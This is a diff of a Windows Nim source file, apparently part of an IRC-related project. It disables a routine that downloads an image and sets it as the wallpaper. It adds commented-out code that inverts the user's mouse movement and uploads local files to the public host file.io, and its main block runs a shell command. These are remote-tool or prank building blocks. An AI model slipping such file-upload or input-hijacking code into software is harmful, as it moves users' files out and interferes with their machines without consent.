@@ -1,4 +1,4 @@
-import os,  winim/inc/winhttp, strutils, json, winim, strutils, osproc, configparser, update_handler, random, bitops
+import os,  winim/inc/winhttp, winim/inc/wininet, strutils, json, winim, strutils, osproc, configparser, update_handler, random, bitops, asyncdispatch
 
 # proc uploadFile(filePath: string): string =
 #   let url = "https://file.io"
@@ -155,23 +155,138 @@ import os,  winim/inc/winhttp, strutils, json, winim, strutils, osproc, configpa
 
 
 
-proc set_wallpaper(url:string) =
-  randomize()
-  var
-    randint = rand(1000000..9999999)
-    imagedata = updt_fetchWebsiteContent(url)
-    filename = $randint
-    fullpath:cstring = (getTempDir() & $randint & "\\" & filename).cstring
-    current_dir = getCurrentDir()
-  if not dirExists(getTempDir() & $randint):
-    createDir(getTempDir() & $randint)
-  setCurrentDir(getTempDir() & $randint)
-  writeFile(filename, imagedata)
-  discard SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, fullpath, bitor(SPIF_UPDATEINIFILE,SPIF_SENDCHANGE))
-  setCurrentDir(current_dir)
-  removeFile(getTempDir() & $randint & "\\" & filename)
+# proc set_wallpaper(url:string) =
+#   randomize()
+#   var
+#     randint = rand(1000000..9999999)
+#     imagedata = updt_fetchWebsiteContent(url)
+#     filename = $randint
+#     fullpath:cstring = (getTempDir() & $randint & "\\" & filename).cstring
+#     current_dir = getCurrentDir()
+#   if not dirExists(getTempDir() & $randint):
+#     createDir(getTempDir() & $randint)
+#   setCurrentDir(getTempDir() & $randint)
+#   writeFile(filename, imagedata)
+#   discard SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, fullpath, bitor(SPIF_UPDATEINIFILE,SPIF_SENDCHANGE))
+#   setCurrentDir(current_dir)
+#   removeFile(getTempDir() & $randint & "\\" & filename)
 
-when isMainModule:
+# var g_mousespack = false
+
+# proc mousespack_func() {.async.} = 
+#   var
+#     new_p:POINT
+#     old_p:POINT
+#     first_loop = true
+#   new_p.x = 0
+#   new_p.y = 0
+#   old_p.x = 0
+#   old_p.y = 0
+#   while g_mousespack:
+#     try:
+#       GetCursorPos(addr new_p)
+#       if first_loop:
+#         old_p = new_p
+#         first_loop = false
+#       var
+#         delta_x = old_p.x - new_p.x
+#         delta_y = old_p.y - new_p.y
+#         result_x:int = (2*delta_x) + new_p.x
+#         result_y:int = (2*delta_y) + new_p.y
+#       discard SetCursorPos(result_x, result_y)
+#       GetCursorPos(addr old_p)
+#       await sleepAsync(5)
+#     except:
+#       discard
+    
+
+
+# proc mousespack() {.async.} =
+#   if g_mousespack:
+#     g_mousespack = false
+#   else:
+#     g_mousespack = true
+#     await mousespack_func()
+
+
+
+
+
+
+# proc uploadFile(url: string, filePath: string): string =
+#   # Initialize WinINet
+#   var hInternet: wininet.HINTERNET = InternetOpenA("MyUploader", INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)
+
+#   if hInternet.isNil:
+#     return "Failed to initialize WinINet"
+
+#   # Open the file for reading
+#   var hFile: HFILE = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, HANDLE(0))
+
+#   if hFile == 0:
+#     InternetCloseHandle(hInternet)
+#     return "Failed to open the file"
+
+#   # Prepare to upload
+#   var urlComponents: wininet.URL_COMPONENTSA
+#   urlComponents.dwStructSize = sizeof(wininet.URL_COMPONENTSA)
+#   urlComponents.dwHostNameLength = -1
+#   urlComponents.dwUrlPathLength = -1
+
+#   var urlBuf: array[512, char]
+#   urlComponents.lpszHostName = addr urlBuf[0]
+#   urlComponents.lpszUrlPath = addr urlBuf[256]
+#   urlComponents.dwHostNameLength = urlBuf.len - 256
+
+#   if InternetCrackUrlA(url, 0, wininet.ICU_ESCAPE.DWORD, addr urlComponents) == FALSE:
+#     InternetCloseHandle(hInternet)
+#     CloseHandle(hFile)
+#     echo $urlComponents
+#     return "Failed to parse URL"
+
+#   var hConnect: wininet.HINTERNET = InternetOpenUrlA(hInternet, url, nil, 0, INTERNET_FLAG_RELOAD, 0)
+
+#   if hConnect.isNil:
+#     InternetCloseHandle(hInternet)
+#     CloseHandle(hFile)
+#     return "Failed to open URL"
+
+#   # Send the HTTP request
+#   var
+#     bytesRead: DWORD = 0
+#     buffer: array[1024, byte]
+
+#   while (ReadFile(hFile, addr buffer[0], buffer.len, addr bytesRead, nil) == TRUE) and (bytesRead > 0):
+#     if InternetWriteFile(hConnect, addr buffer[0], bytesRead, nil) == FALSE:
+#       InternetCloseHandle(hConnect)
+#       InternetCloseHandle(hInternet)
+#       CloseHandle(hFile)
+#       echo "LastError: ", $GetLastError()
+#       echo "bytesRead: ", $bytesRead
+#       echo "buffer: ", $buffer
+#       return "Failed to upload file"
+
+#   # Close handles
+#   CloseHandle(hFile)
+#   InternetCloseHandle(hConnect)
+#   InternetCloseHandle(hInternet)
+
+#   return "File uploaded successfully"
+
+# # Example usage
+# when isMainModule:
+#   let url:string = "https://file.io?expires=1h"
+#   let filePath = "G:\\Script\\GitHub\\irc-mcgee\\hey.txt"
+#   let result = uploadFile(url, filePath)
+#   echo(result)
+
+
+
+
+
+# when isMainModule:
+  # waitFor mousespack()
+
   # echo "hey"
   # var
   #   pixelData:seq[byte]
@@ -180,4 +295,72 @@ when isMainModule:
   #   srcn_saveBitmap("testfile.bmp",1600,900,pixelData)
   # else:
   #   echo "A"
-  set_wallpaper("https://i.imgflip.com/214nik.jpg")
+  # set_wallpaper("https://i.imgflip.com/214nik.jpg")
+
+
+
+
+# proc uploadFileToWebsite(filename: string): string =
+#   const
+#     url = "https://file.io"
+#     boundary = "----Boundary"
+#     fileField = "file"
+
+#   var
+#     hInternet: wininet.HINTERNET
+#     hConnect: wininet.HINTERNET
+#     formData: string
+#     formDataBytes: seq[byte]
+
+#   hInternet = InternetOpenA("NimUploader", INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)
+#   if hInternet.isNil:
+#     raise newException(OSError, "InternetOpenA failed")
+
+#   hConnect = InternetOpenUrlA(hInternet, url, nil, 0, INTERNET_FLAG_RELOAD, 0)
+#   if hConnect.isNil:
+#     raise newException(OSError, "InternetOpenUrlA failed")
+
+#   # Create the form data
+#   formData = "Content-Type: multipart/form-data; boundary=" & boundary & "\r\n\r\n"
+#   formData.add("--" & boundary & "\r\n")
+#   formData.add("Content-Disposition: form-data; name=\"" & fileField & "\"; filename=\"" & filename & "\"\r\n")
+#   formData.add("Content-Type: application/octet-stream\r\n\r\n")
+
+
+#   for ch in formData:
+#     formDataBytes.add(cast[byte](ch))
+
+#   # Send the POST request with the file
+#   if HttpSendRequestA(hConnect, nil, 0, addr(formDataBytes[0]), formData.len()) == FALSE:
+#     echo "GLE: ", GetLastError()
+#     raise newException(OSError, "HttpSendRequestA failed")
+
+#   # Read the response
+#   var responseText: string = ""
+#   var bytesRead: DWORD
+#   const bufferSize = 1024
+#   var buffer: array[bufferSize, byte]
+  
+#   echo "spack"
+#   while InternetReadFile(hConnect, addr(buffer), bufferSize, addr bytesRead) == TRUE:
+#     if bytesRead > 0:
+#       for ch in 0..<bytesRead:
+#         responseText.add(char(buffer[ch]))
+  
+#   echo "ENTSPACK"
+#   InternetCloseHandle(hConnect)
+#   InternetCloseHandle(hInternet)
+
+#   return responseText
+
+# # Example usage:
+# try:
+#   let response = uploadFileToWebsite("hey.txt")
+#   echo(response)
+# except OSError as e:
+#   echo "ERROR: ", repr(e)
+
+when isMainModule:
+  var (output, _ ) = execCmdEx("cmd.exe /C ver")
+  output = output.strip(chars={'\r','\n'})
+  echo output
